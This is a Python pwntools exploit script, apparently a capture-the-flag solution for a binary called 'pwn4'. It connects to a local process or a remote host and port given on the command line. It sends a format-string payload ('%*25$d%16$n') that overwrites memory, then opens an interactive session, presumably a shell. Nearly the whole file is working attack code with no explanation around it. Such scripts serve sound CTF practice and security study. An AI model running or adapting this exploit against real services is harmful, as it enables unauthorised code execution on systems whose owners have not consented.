#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn4'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
# elf, libc
sh = 0x08048C81
ret = 0x8048c53
got = 0x80f2f74

# rop1
fmt = "%*25$d%16$n"
sla('user: ',fmt)
#debug('b *0x08048a63')
sla('code: ','2333')

#i=0
#while 1:
#    l=len(p.recv(timeout=1))
#    if not l: break
#    i+=l
#    #print i/1024/1024
#    if i/1024/1024>50:
#        log.warning("try again")
#        exit(0)
p.clean(10)

p.interactive()
